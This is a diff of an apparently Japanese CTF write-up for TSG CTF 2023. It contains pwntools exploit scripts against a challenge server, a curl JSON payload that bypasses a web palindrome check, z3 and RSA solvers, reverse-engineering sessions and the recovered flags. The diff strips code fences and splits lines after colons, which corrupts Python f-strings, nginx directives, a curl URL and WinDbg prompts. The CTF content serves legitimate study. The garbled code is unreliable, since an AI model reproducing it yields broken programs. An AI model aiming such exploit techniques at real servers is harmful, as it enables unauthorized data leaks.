@@ -27,11 +27,6 @@ In TSG CTF, Beginner's tasks are not "beginner-level challenges." We define a be
 RELEASE SCHEDULE
 Disclaimer: This schedule is tentative. We will make the best effort to deliver these challenges as planned. However any changes are expected anytime.
 (省略)
-```
-
-
-
-```
 c:\>ver
 
 Microsoft Windows [Version 10.0.19045.3636]
@@ -44,11 +39,6 @@ c:\>wsl -l -v
  docker-desktop Stopped 2
 
 c:\>
-```
-
-
-
-```
 $ cat /proc/version
 Linux version 5.15.90.1-microsoft-standard-WSL2 (oe-user@oe-host) (x86_64-msft-linux-gcc (GCC) 9.3.0, GNU ld (GNU Binutils) 2.34.0.20200220) #1 SMP Fri Jan 27 02:56:13 UTC 2023
 $ cat /etc/os-release
@@ -94,18 +84,8 @@ Release-Date: 2022-01-05
 Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp
 Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets zstd
 $
-```
-
-
-
-```
 TSG CTF のDiscordサーバーにログインして↓の場所に書いてあるフラグを送信してください。
 (ここにDiscordチャンネルのスクリーンショット)
-```
-
-
-
-```
 mikit — Today at 3:45 PM
 @everyone Welcome to TSG CTF Discord!
 
@@ -131,11 +111,6 @@ Sanity Check
 Here is your sanity 🙂
 
 TSGCTF{G3n3r@t1v3_@I_4lways_c0mes_up_w1th_b3tt3r_punchl1n3s_th@n_m3!}
-```
-
-
-
-```
 # -*- speaking: utf-8 -*-
 
 nc 34.146.195.242 40002
@@ -146,24 +121,14 @@ nc 34.146.195.242 40002
 添付ファイル内のflag.txtは偽物です！問題サーバーにあるものとは異なります。
 あなたがすべきことは、フラグを推測すること...ではなくフラグをリークさせることです。つまりただクイズに答えるのではなく何か特別なことをしてください。
 怪しい関数の仕様を調べてみてください。
-```
-
-
-
-```
 $ file *
 Makefile: makefile script, ASCII text
 chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bc06581d875959a12c1a58c826ac31c0e4bf0cbe, for GNU/Linux 3.2.0, not stripped
 flag.txt: ASCII text, with no line terminators
 main.c: C source, Unicode text, UTF-8 text
 $
-```
-
-
-
-```
 (略)
-#define MAX_FLAG_CHARS 31
+    #define MAX_FLAG_CHARS 31
 
 char utf32_hexstr[3][MAX_FLAG_CHARS * 8 + 1];
 char utf8_bin[MAX_FLAG_CHARS * 4 + 1];
@@ -204,30 +169,34 @@ int main() {
  }
  (略)
 }
-```
-
-
-
-```
-.bss:0000000000004040 public utf32_hexstr
-.bss:0000000000004040 ; char utf32_hexstr[3][249]
-.bss:0000000000004040 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? utf32_hexstr db 300h dup(?) ; DATA XREF: main+164↑o
-.bss:0000000000004040 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??… ; main+1F6↑o
-.bss:0000000000004340 public utf8_bin
-.bss:0000000000004340 ; char utf8_bin[125]
-.bss:0000000000004340 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? utf8_bin db 80h dup(?) ; DATA XREF: main+1C3↑o
-.bss:0000000000004340 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??… ; main+2D0↑o ...
-.bss:00000000000043C0 public flag_buffer
-.bss:00000000000043C0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? flag_buffer db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
-.bss:00000000000043C0 ; DATA XREF: main+52↑o
-.bss:00000000000043C0 ; main+AB↑o
-.bss:00000000000043CB ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
-.bss:00000000000043D6 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
-```
-
-
-
-```
+.bss:
+0000000000004040 public utf32_hexstr
+.bss:
+0000000000004040 ; char utf32_hexstr[3][249]
+.bss:
+0000000000004040 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? utf32_hexstr db 300h dup(?) ; DATA XREF: main+164↑o
+.bss:
+0000000000004040 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??… ; main+1F6↑o
+.bss:
+0000000000004340 public utf8_bin
+.bss:
+0000000000004340 ; char utf8_bin[125]
+.bss:
+0000000000004340 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? utf8_bin db 80h dup(?) ; DATA XREF: main+1C3↑o
+.bss:
+0000000000004340 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??… ; main+2D0↑o ...
+.bss:
+00000000000043C0 public flag_buffer
+.bss:
+00000000000043C0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? flag_buffer db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
+.bss:
+00000000000043C0 ; DATA XREF: main+52↑o
+.bss:
+00000000000043C0 ; main+AB↑o
+.bss:
+00000000000043CB ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
+.bss:
+00000000000043D6 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
 #!/usr/bin/env python3
 import pwn
 
@@ -246,7 +215,8 @@ def solve(io):
  invalid_codepoint_hex = b"FFFFFFFF" # c32rtomb関数が-1を返すもの
  long_in_utf8_codepoint_hex = b"0001f680" # ロケットの絵文字、utf-8で4バイト
  digit_0_codepoint_hex = b"00000030" # ord("0")
- digit_for_rocket_hex = "".join(map(lambda b: f"{b:08x}",long_in_utf8_codepoint_hex)).encode()
+ digit_for_rocket_hex = "".join(map(lambda b: f"{b:
+08x}",long_in_utf8_codepoint_hex)).encode()
  print(f"{digit_for_rocket_hex = }")
 
  io.sendafter(
@@ -269,11 +239,6 @@ with pwn.remote("34.146.195.242", 40002) as io: solve(io)
 # continue
 # """
 # with pwn.gdb.debug(BIN_PATH, COMMANDS) as io: solve(io)
-```
-
-
-
-```
 $ ./solve.py
 [!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_RISCV'
 [*] '/mnt/d/Documents/work/ctf/TSG_CTF_2023/converter/chall'
@@ -290,15 +255,11 @@ digit_for_rocket_hex = b'0000003000000030000000300000003100000066000000360000003
 Result announcement 🥳🥳
 Q1: Wrong :( Your input:
 Q2: Wrong :( Your input:
-Q3: Wrong :( Your input: 🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀ὨCTF{NoEmojiHereThough:cry:}
+Q3: Wrong :( Your input: 🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀ὨCTF{NoEmojiHereThough:
+cry:}
 Score 0/3. Try harder!
 
 $
-```
-
-
-
-```
 Now I'm calling from the Alps.
 
 nc 34.146.195.242 40004
@@ -309,11 +270,6 @@ nc 34.146.195.242 40004
 添付ファイル内のflag.txtは偽物です！問題サーバーにあるものとは異なります。
 あなたがすべきことは、フラグを推測すること...ではなくフラグをリークさせることです。つまりただクイズに答えるのではなく何か特別なことをしてください。
 怪しい関数の仕様を調べてみてください。
-```
-
-
-
-```
 $ file *
 Dockerfile: ASCII text
 chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
@@ -331,11 +287,6 @@ $ diff main.c ../converter/main.c
 $ diff chall ../converter/chall
 Binary files chall and ../converter/chall differ
 $
-```
-
-
-
-```
 $ ls -AlF chall
 -rwxrwxrwx 1 tan tan 18800 Nov 4 16:00 chall*
 $ ./chall
@@ -353,11 +304,6 @@ $ pwn checksec chall
  NX: NX enabled
  PIE: PIE enabled
 $
-```
-
-
-
-```
 $ ./solve.py
 [!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_RISCV'
 [*] '/mnt/d/Documents/work/ctf/TSG_CTF_2023/converter2/chall'
@@ -378,25 +324,16 @@ Q3: Wrong :( Your input: 🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀�
 Score 0/3. Try harder!
 
 $
-```
-
-
-
-```
 設定が正しいか、413回チェックしました。
 
-http://34.84.176.251:12349
+http://34.84.176.251:
+12349
 
 初心者向けヒント
 とりあえず、上のリンクを開いて、適当に操作してみてください。この問題は「非常に長い回文」をサーバーに送ることでフラグが手に入ると主張していますが、話はそんなに単純ではないことがすぐに分かります。
 次に、添付したソースコードを読んでください。main.mjs や nginx.conf といったファイルにこのウェブサイトの重要なロジックが記述されています。flag という変数にフラグが保存されているので、この値をリークすることが目的となります。
 これらのヒントを元に、「非常に長い回文」をサーバーに送るのではなく、何かしらのバグを突くことによってフラグを手に入れる方法を考えましょう。Web技術、特にJavaScriptについての知識が必要になるかもしれないので、必要に応じてMDNなどのドキュメントを参照してください。
 なお、この問題を解くのに大量のアクセスをする必要はありません。ルールに書かれている通り、DoS まがいの大量アクセスはご遠慮ください。
-```
-
-
-
-```
 $ file *
 compose.yaml: ASCII text
 index.html: HTML document, ASCII text
@@ -405,11 +342,6 @@ nginx.conf: ASCII text
 package-lock.json: JSON data
 package.json: JSON data
 $
-```
-
-
-
-```
 import {serve} from '@hono/node-server';
 import {serveStatic} from '@hono/node-server/serve-static';
 import {Hono} from 'hono';
@@ -450,53 +382,31 @@ app.post('/', async (c) => {
 app.port = 12349;
 
 serve(app);
-```
-
-
-
-```
 events {
  worker_connections 1024;
 }
 
 http {
  server {
- listen 0.0.0.0:12349;
+ listen 0.0.0.0:
+12349;
  client_max_body_size 100;
  location / {
- proxy_pass http://app:12349;
+ proxy_pass http://app:
+12349;
  proxy_read_timeout 5s;
  }
  }
 }
-```
-
-
-
-```
-$ curl 'http://34.84.176.251:12349/' -H 'Content-Type: application/json' --data-raw '{"palindrome":{"length":"1000","0":"0","999":"0"}}'
+$ curl 'http://34.84.176.251:
+12349/' -H 'Content-Type: application/json' --data-raw '{"palindrome":{"length":"1000","0":"0","999":"0"}}'
 I love you! Flag is TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}
 $
-```
-
-
-
-```
 フラグの内容はユニークにしたほうがいい問題になるって聞きました。
-```
-
-
-
-```
 $ file *
 encrypt.py: Python script, ASCII text executable
 output.txt: ASCII text, with very long lines (19805)
 $
-```
-
-
-
-```
 from Crypto.Util.number import getPrime
 
 p = getPrime(1024)
@@ -522,11 +432,6 @@ clues.sort()
 print(f'N = {N}')
 print(f'e = {e}')
 print(f'clues = {clues}')
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import ast
@@ -572,11 +477,6 @@ for k in known:
  used.add(k)
 flag = known[:-1] + dfs(set(), ord(known[-1]), len(known))
 print(flag)
-```
-
-
-
-```
 $ ./solve.py
 ! -> d
 , -> I
@@ -694,17 +594,7 @@ x -> ?
 ~ -> <
 TSGCTF{OK,IsTHi5A_un1qUe-flag?XD}
 $
-```
-
-
-
-```
 これは私のシンプルなストリーム暗号です。突破できますか？
-```
-
-
-
-```
 $ file *
 encrypt.py: ASCII text
 output.py: Unicode text, UTF-8 (with BOM) text, with very long lines (1405)
@@ -712,11 +602,6 @@ README.md: Unicode text, UTF-8 text, with no line terminators
 $ cat README.md
 解答者に配布するソースコードなどのファイルをここに置く
 $
-```
-
-
-
-```
 import secrets
 import hashlib
 import base64
@@ -734,11 +619,6 @@ encrypted_flags = [flag[i]^key_stream[i%16] for i in range(len(flag))]
 
 print("cipher =",encrypted_flags)
 print("flag_length =",len(flag))
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import z3
@@ -758,9 +638,11 @@ flag_prefix = "TSGCTF{"
 size_md5_digest_base64 = 24 # b'CY9rzUYh03PK3k6DJie09g=='等、後ろ2文字は=になるはず
 size_flag_content = flag_length - (len(flag_prefix) + len("@") + size_md5_digest_base64 + len("}"))
 solver = z3.Solver()
-keys = [z3.BitVec(f"key_stream_{i:02d}", 8) for i in range(16)]
+keys = [z3.BitVec(f"key_stream_{i:
+02d}", 8) for i in range(16)]
 
-def add_key_range(c, candidates:str):
+def add_key_range(c, candidates:
+str):
  solver.add(0x21 <= c)
  solver.add(c <= 0x7e)
  for i in range(0x20, 0x7f):
@@ -834,11 +716,6 @@ while True:
  for i in range(len(keys)):
  block.append(keys[i] != secret[i])
  solver.add(z3.Or(block))
-```
-
-
-
-```
 $ time ./solve.py
 (略)
 143600
@@ -847,11 +724,6 @@ TSGCTF{The_l0n63|2_+|-|3_fla6_the_saf3|2_i+_m4`/_8e_as_lo|\|g_4$_you_use_a|\|_a|
 Solved!
 ./solve.py 7308.84s user 1.57s system 99% cpu 2:01:50.50 total
 $
-```
-
-
-
-```
 // 左6列が探索対象、右10列は完全固定
 VmoFl+ n63|2_+|-|
 1Zlua- _the_saf3|
@@ -870,11 +742,6 @@ vmoF$/ |\/|e_r4nd
 mhUwuv 83r$_re|*3
 6.9e)w y._enjoy_h
 cmkqaD :-)-:)-:)
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import z3
@@ -895,9 +762,11 @@ flag_prefix = "TSGCTF{"
 size_md5_digest_base64 = 24 # b'CY9rzUYh03PK3k6DJie09g=='等、後ろ2文字は=になるはず
 size_flag_content = flag_length - (len(flag_prefix) + len("@") + size_md5_digest_base64 + len("}"))
 solver = z3.Solver()
-keys = [z3.BitVec(f"key_stream_{i:02d}", 8) for i in range(16)]
+keys = [z3.BitVec(f"key_stream_{i:
+02d}", 8) for i in range(16)]
 
-def add_key_range(c, candidates:str):
+def add_key_range(c, candidates:
+str):
  solver.add(0x21 <= c)
  solver.add(c <= 0x7e)
  for i in range(0x20, 0x7f):
@@ -982,11 +851,6 @@ while True:
  for i in range(len(keys)):
  block.append(keys[i] != secret[i])
  solver.add(z3.Or(block))
-```
-
-
-
-```
 $ time ./solve_esper.py
 (略)
 secret = [247, 176, 17, 0, 156, 72, 203, 232, 13, 179, 42, 62, 83, 41, 241, 70]
@@ -1013,11 +877,6 @@ TSGCTF{The_l0n63|2_+|-|3_fla6_the_saf3|2_i+_m4`/_8e_as_lo|\|g_4$_you_use_a|\|_a|
 Solved!
 ./solve_esper.py 3.06s user 0.25s system 99% cpu 3.346 total
 $
-```
-
-
-
-```
 一つ一つ対処していくとしよう。
 
 初心者向けのヒント:
@@ -1027,29 +886,14 @@ x64dbgやWindbgを使って動かしてみよう
 暗号化の方式ややっている処理はググれば出てくるかも？
 入力した文字列は最終的に何と比べられているのだろう
 各処理を元に戻していこう
-```
-
-
-
-```
 $ file *
 beginners-rev-2023.exe: PE32+ executable (console) x86-64, for MS Windows
 $
-```
-
-
-
-```
 00000000 EncryptionContext struc ; (sizeof=0x408, mappedto_34)
 00000000 dwSomething0 dd ?
 00000004 dwSomething4 dd ?
 00000008 dwArraySboxSize256 dd 256 dup(?)
 00000408 EncryptionContext ends
-```
-
-
-
-```
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
  EncryptionContext *pContext; // rdi
@@ -1174,11 +1018,6 @@ int __fastcall main(int argc, const char **argv, const char **envp)
  puts(pStrOutput);
  return 0;
 }
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import struct
@@ -1196,35 +1035,31 @@ def inv_xor_shr12(x):
 def inv_xor_shr12_bytearray(b):
  for i in range(len(b) // 8):
  v = struct.unpack("<Q", b[i*8:(i+1)*8])[0]
- # print(f"{i=}, {v=:16x}")
+ # print(f"{i=}, {v=:
+16x}")
  original = inv_xor_shr12(v)
  b[i*8:(i+1)*8] = struct.pack("<Q", original)
 
-# IDAで「.data:0000000140004040」以降をしばらく範囲選択して、Shift+Eで「Export data」して取得しました
+# IDAで「.data:
+0000000140004040」以降をしばらく範囲選択して、Shift+Eで「Export data」して取得しました
 expected = bytearray.fromhex("07 56 E5 58 71 89 9A CA F0 67 03 2D 49 FB 6E 86 C2 F7 48 CA 3C 43 DB 8E 04 2A 56 4A 97 33 A1 A2 07 83 F0 89 19 13 77 B4 9F 7D 7B 9C DD 8E FD AD B5 E2 28 0E 06 AF E5 E3 86 C3 08 AD E6 4C DE 63 A3 5F 1E 96 34 7D 9D 19 F5 C8 84 7F 7B 62 2A 6B C1 28 3B 6D 09 EF FC CB A0 90 9A 3E 66 A2 4E 06 90 2C 9D AE 3C 99 40 53 4C 69 63 E7 B9 A8 B3 87 A5 97 98 FE 1F 20 51 A7 AE 0D 00 AB 16 35 59 3D 08 1B 1C 92 E2 4F 1D 86 A5 6E 0A 14 45 4D 61 08 69 C3 12 A2 EB 50 13 93 22 E2 C4 10 CA 5F B2 0B A2 30 C8 54 91 3A 37 FD D2 10 AB 5A F8 38 F3 D3 D5 85 58 DE DF C0 F4 17 4E F7 31 79 DD 41 2F B3 20 C7 EC 98 5E AE F7 A9 CB 27 13 72 FE CA 64 FF 43 93 80 3E 1E E5 99 BF 41 4B 9D 85 4E 0F 99 94 57 E1 63 D9 01 85 78 8A 06 FE 9D 41 32 74 55 83 B2 85 E9 9F C6 2C 4B 62 8F BF 7D 57 C8 76 3B 31 5E 87 60 89 35 41 C1 52 6C D0 0B 7D CA 60 5D 82 19 B0 96 5E 16 E7 9B 2F 37 5F C9 C5 F3 20 C3 45 CB 47 A1 CC 79 E5 B6 FB D4 55 DB C1 35 9B 8B FA 38 D5 B2 B5 E0 4F 4D 6C 4F 8C 0C 42 BC 8E B3 78 48 E4 87 8E 34 A3 1D 01 53 98 71 FA 8F 2F E3 7A 6B B9 1B B6 7E 34 7F C8 C4 6C AB 45 4D 81 EF EE C3 D9 DB 13 5B 63 90 FC 34 18 81 BC D1 18 48 BB 7C 24 5B 56 2B 35 6B D7 F9 D3 D5 2B E2 24 D8 50 F1 EC D5 E6 29 55 66 F2 F7 28 20 7D F3 47 40 03 11 4A 47 A5 B4 74 15 35 D0 F0 E5 4C 04 B5 59 FE FC 45 9D 3A A1 3F 1A A7 A8 51 E5 65 F1 56 EE DE FC C4 87 F5 FA 79 31 07 0A 3F 41 28 D1 59 17 4D 02 E4 5A 22 3A BC D2 CD 80 BC 2A 49 F0 7F 97 A1 90 59 01 8D 25 43 D8 00 EA D8 4F E2 4E 2B 06 FD 7E 16 A9 92 C4 FD B5 6A 82 06 18 0C 0A B7 B8 29 8F 87 63 65 25 B9 7A D0 6E 30 3C F2 F7 C2 30 86")
 
 inv_xor_shr12_bytearray(expected)
 print("restored bitshift+xor: ", end="")
-print(' '.join(map(lambda b:f"{b:02x}", expected)))
-```
-
-
-
-```
+print(' '.join(map(lambda b:f"{b:
+02x}", expected)))
 $ ./solve1.py
 restored bitshift+xor: 0b cb d0 59 13 20 96 ca 39 97 0c ff 20 9d 66 86 67 55 2a 2a 06 ae d3 8e be a9 3b d8 26 19 ab a2 cb c0 3c c4 dc 54 7c b4 ae 12 f3 86 a8 51 f7 ad 2e bf d9 15 bf 91 eb e3 b1 72 13 bb 61 71 d8 63 9f c4 b3 d9 fa e4 9c 19 cd 86 e3 74 b6 d0 2c 6b 1e f7 fd 6d 0c 50 f0 cb 5f f3 3f 56 8a c6 4e 06 3a a3 fa 78 66 ad 45 53 ad 1b 2e d7 04 d3 bb 87 88 d4 32 a4 aa 55 5b a7 0e 05 8a a0 b8 e0 5a 3d b0 8a 1b 79 b0 2e 15 86 a2 77 90 a1 59 cb 61 08 f3 af c9 b6 4d 61 1a 93 32 0a 81 5e e4 e4 b2 0b e4 63 34 c5 1f e9 38 fd 48 a2 29 2b 18 07 fe d3 7b e4 1a 26 84 bf f5 17 11 fe 95 40 9a 73 24 b3 6c c4 34 80 8d 31 fd a9 4f 4b c8 b6 4d 3c 6b ff b7 44 7f fd 3f 1c 92 bf 74 58 33 e1 4a 46 90 94 90 74 5c f9 03 22 70 8a 86 01 f8 5f e6 41 5d 83 34 6d 88 1e 16 08 4d 62 57 86 9d 03 4e 65 38 31 08 62 55 5e 73 6d c4 52 f5 9e e9 24 9e 45 55 82 c4 de ed b6 87 1e 99 2f af 87 89 0d 84 7c c7 45 fd 61 63 22 ec 5e b9 fb 97 3e b4 f6 76 33 84 fa 15 d6 32 00 58 8b 4b 6c 9a 50 cd 1d fc 05 b4 78 96 e3 7d a0 ef b2 1d 01 ac f8 0f e6 c7 81 e4 7a 52 9d 43 82 45 b3 73 c8 c2 6d 10 b0 5b 6f e1 ee c7 45 c0 b9 a1 aa 9f fc 57 3b 36 72 eb ac 43 bb ac 0e ad 62 4f 43 66 d7 1c 5e de b8 30 29 dd 50 72 3f 38 dd be 73 69 f2 b7 0e 64 42 f4 73 40 03 9d c8 28 f8 d6 25 16 35 c5 5f f1 4a 61 50 56 fe f8 49 c0 d0 a5 4e 10 a7 14 c5 4b e9 ca b8 e3 de db 76 22 5b ea 0a 31 07 bf 52 db a6 e9 88 13 4d 93 1d 99 3f dc 61 de cd 00 08 48 2b 26 66 9d a1 e2 28 17 67 a1 4e d8 00 48 2d 5a 5f d1 fb 09 fd 12 cd b6 fd f1 56 b3 6a c4 6f 94 c6 a8 2c ba 29 37 8f 8b 80 5e be 77 d0 48 6e e2 e5 7d a1 38 86
 $
-```
-
-
-
-```
-0:000> bu 0x0000000140001B59
-0:000> g
+0:
+000> bu 0x0000000140001B59
+0:
+000> g
 Breakpoint 0 hit
 beginners_rev_2023_Removed_DllCanMove+0x1b59:
 00000001`40001b59 e882f5ffff call beginners_rev_2023_Removed_DllCanMove+0x10e0 (00000001`400010e0)
-0:000> db @r8
+0:
+000> db @r8
 00000000`005ebe40 42 22 74 74 00 00 00 00-00 00 00 00 00 00 00 00 B"tt............
 00000000`005ebe50 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
 00000000`005ebe60 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
@@ -1233,13 +1068,17 @@ beginners_rev_2023_Removed_DllCanMove+0x1b59:
 00000000`005ebe90 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
 00000000`005ebea0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
 00000000`005ebeb0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
-0:000> eb @r8 0b cb d0 59 13 20 96 ca 39 97 0c ff 20 9d 66 86 67 55 2a 2a 06 ae d3 8e be a9 3b d8 26 19 ab a2 cb c0 3c c4 dc 54 7c b4 ae 12 f3 86 a8 51 f7 ad 2e bf d9 15 bf 91 eb e3 b1 72 13 bb 61 71 d8 63 9f c4 b3 d9 fa e4 9c 19 cd 86 e3 74 b6 d0 2c 6b 1e f7 fd 6d 0c 50 f0 cb 5f f3 3f 56 8a c6 4e 06 3a a3 fa 78 66 ad 45 53 ad 1b 2e d7 04 d3 bb 87 88 d4 32 a4 aa 55 5b a7 0e 05 8a a0 b8 e0 5a 3d b0 8a 1b 79 b0 2e 15 86 a2 77 90 a1 59 cb 61 08 f3 af c9 b6 4d 61 1a 93 32 0a 81 5e e4 e4 b2 0b e4 63 34 c5 1f e9 38 fd 48 a2 29 2b 18 07 fe d3 7b e4 1a 26 84 bf f5 17 11 fe 95 40 9a 73 24 b3 6c c4 34 80 8d 31 fd a9 4f 4b c8 b6 4d 3c 6b ff b7 44 7f fd 3f 1c 92 bf 74 58 33 e1 4a 46 90 94 90 74 5c f9 03 22 70 8a 86 01 f8 5f e6 41 5d 83 34 6d 88 1e 16 08 4d 62 57 86 9d 03 4e 65 38 31 08 62 55 5e 73 6d c4 52 f5 9e e9 24 9e 45 55 82 c4 de ed b6 87 1e 99 2f af 87 89 0d 84 7c c7 45 fd 61 63 22 ec 5e b9 fb 97 3e b4 f6 76 33 84 fa 15 d6 32 00 58 8b 4b 6c 9a 50 cd 1d fc 05 b4 78 96 e3 7d a0 ef b2 1d 01 ac f8 0f e6 c7 81 e4 7a 52 9d 43 82 45 b3 73 c8 c2 6d 10 b0 5b 6f e1 ee c7 45 c0 b9 a1 aa 9f fc 57 3b 36 72 eb ac 43 bb ac 0e ad 62 4f 43 66 d7 1c 5e de b8 30 29 dd 50 72 3f 38 dd be 73 69 f2 b7 0e 64 42 f4 73 40 03 9d c8 28 f8 d6 25 16 35 c5 5f f1 4a 61 50 56 fe f8 49 c0 d0 a5 4e 10 a7 14 c5 4b e9 ca b8 e3 de db 76 22 5b ea 0a 31 07 bf 52 db a6 e9 88 13 4d 93 1d 99 3f dc 61 de cd 00 08 48 2b 26 66 9d a1 e2 28 17 67 a1 4e d8 00 48 2d 5a 5f d1 fb 09 fd 12 cd b6 fd f1 56 b3 6a c4 6f 94 c6 a8 2c ba 29 37 8f 8b 80 5e be 77 d0 48 6e e2 e5 7d a1 38 86
-0:000> r @r9
+0:
+000> eb @r8 0b cb d0 59 13 20 96 ca 39 97 0c ff 20 9d 66 86 67 55 2a 2a 06 ae d3 8e be a9 3b d8 26 19 ab a2 cb c0 3c c4 dc 54 7c b4 ae 12 f3 86 a8 51 f7 ad 2e bf d9 15 bf 91 eb e3 b1 72 13 bb 61 71 d8 63 9f c4 b3 d9 fa e4 9c 19 cd 86 e3 74 b6 d0 2c 6b 1e f7 fd 6d 0c 50 f0 cb 5f f3 3f 56 8a c6 4e 06 3a a3 fa 78 66 ad 45 53 ad 1b 2e d7 04 d3 bb 87 88 d4 32 a4 aa 55 5b a7 0e 05 8a a0 b8 e0 5a 3d b0 8a 1b 79 b0 2e 15 86 a2 77 90 a1 59 cb 61 08 f3 af c9 b6 4d 61 1a 93 32 0a 81 5e e4 e4 b2 0b e4 63 34 c5 1f e9 38 fd 48 a2 29 2b 18 07 fe d3 7b e4 1a 26 84 bf f5 17 11 fe 95 40 9a 73 24 b3 6c c4 34 80 8d 31 fd a9 4f 4b c8 b6 4d 3c 6b ff b7 44 7f fd 3f 1c 92 bf 74 58 33 e1 4a 46 90 94 90 74 5c f9 03 22 70 8a 86 01 f8 5f e6 41 5d 83 34 6d 88 1e 16 08 4d 62 57 86 9d 03 4e 65 38 31 08 62 55 5e 73 6d c4 52 f5 9e e9 24 9e 45 55 82 c4 de ed b6 87 1e 99 2f af 87 89 0d 84 7c c7 45 fd 61 63 22 ec 5e b9 fb 97 3e b4 f6 76 33 84 fa 15 d6 32 00 58 8b 4b 6c 9a 50 cd 1d fc 05 b4 78 96 e3 7d a0 ef b2 1d 01 ac f8 0f e6 c7 81 e4 7a 52 9d 43 82 45 b3 73 c8 c2 6d 10 b0 5b 6f e1 ee c7 45 c0 b9 a1 aa 9f fc 57 3b 36 72 eb ac 43 bb ac 0e ad 62 4f 43 66 d7 1c 5e de b8 30 29 dd 50 72 3f 38 dd be 73 69 f2 b7 0e 64 42 f4 73 40 03 9d c8 28 f8 d6 25 16 35 c5 5f f1 4a 61 50 56 fe f8 49 c0 d0 a5 4e 10 a7 14 c5 4b e9 ca b8 e3 de db 76 22 5b ea 0a 31 07 bf 52 db a6 e9 88 13 4d 93 1d 99 3f dc 61 de cd 00 08 48 2b 26 66 9d a1 e2 28 17 67 a1 4e d8 00 48 2d 5a 5f d1 fb 09 fd 12 cd b6 fd f1 56 b3 6a c4 6f 94 c6 a8 2c ba 29 37 8f 8b 80 5e be 77 d0 48 6e e2 e5 7d a1 38 86
+0:
+000> r @r9
 r9=000000000014fcc0
-0:000> p
+0:
+000> p
 beginners_rev_2023_Removed_DllCanMove+0x1b5e:
 00000001`40001b5e 488d442448 lea rax,[rsp+48h]
-0:000> db 0x000000000014fcc0
+0:
+000> db 0x000000000014fcc0
 00000000`0014fcc0 21 67 03 26 e0 d1 7c 79-c7 00 58 24 f7 33 6a 64 !g.&..|y..X$.3jd
 00000000`0014fcd0 b8 33 58 47 64 01 36 37-27 98 e1 59 1b c7 72 5f .3XGd.67'..Y..r_
 00000000`0014fce0 c4 75 69 57 15 f4 75 79-83 22 79 56 34 90 31 5f .uiW..uy."yV4.1_
@@ -1248,11 +1087,6 @@ beginners_rev_2023_Removed_DllCanMove+0x1b5e:
 00000000`0014fd10 95 f6 49 8f 87 78 68 31-98 62 58 63 d3 47 6d 37 ..I..xh1.bXc.Gm7
 00000000`0014fd20 e4 75 7d 00 00 00 00 00-00 00 00 00 00 00 00 00 .u}.............
 00000000`0014fd30 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import struct
@@ -1270,7 +1104,8 @@ def inv_xor_shr12(x):
 def inv_xor_shr12_bytearray(b):
  for i in range(len(b) // 8):
  v = struct.unpack("<Q", b[i*8:(i+1)*8])[0]
- # print(f"{i=}, {v=:16x}")
+ # print(f"{i=}, {v=:
+16x}")
  original = inv_xor_shr12(v)
  b[i*8:(i+1)*8] = struct.pack("<Q", original)
 
@@ -1287,49 +1122,35 @@ e4 75 7d 00 00 00 00 00 00 00 00 00 00 00 00 00
 # print(modified_flag.hex())
 inv_xor_shr12_bytearray(modified_flag)
 print(modified_flag.rstrip(b"\x00").decode())
-```
-
-
-
-```
 $ ./solve2.py
 TSGCTF{y0u_w0uld_und3r57and_h0w_70_d3cryp7_arc4_and_h0w_70_d3cryp7_7h3_l3ak3d_5af3_l1nk1ng_p01n73r}
 $
-```
-
-
-
-```
 T「グアアアア」 S「Tがやられたようだな…」 G「フフフ…奴は百天王の中でも最弱…」 C「人間ごときに負けるとはTSGerの面汚しよ…」
-```
-
-
-
-```
 $ file *
